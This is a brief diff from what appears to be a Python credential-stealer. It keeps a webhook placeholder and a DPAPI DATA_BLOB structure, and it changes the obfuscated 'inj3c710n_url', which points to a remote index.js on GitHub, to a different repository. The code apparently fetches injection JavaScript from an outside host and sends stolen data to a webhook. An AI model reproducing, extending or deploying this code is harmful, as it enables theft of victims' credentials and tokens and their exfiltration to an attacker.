@@ -72,7 +72,7 @@ for module in ModuleRequirements:
 
 
 h00k = "WEBHOOK HERE"
-inj3c710n_url = f"https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+inj3c710n_url = f"https://raw.githubusercontent.com/Ayhx1337/index/main/index.js"
 
 class DATA_BLOB(Structure):
     _fields_ = [
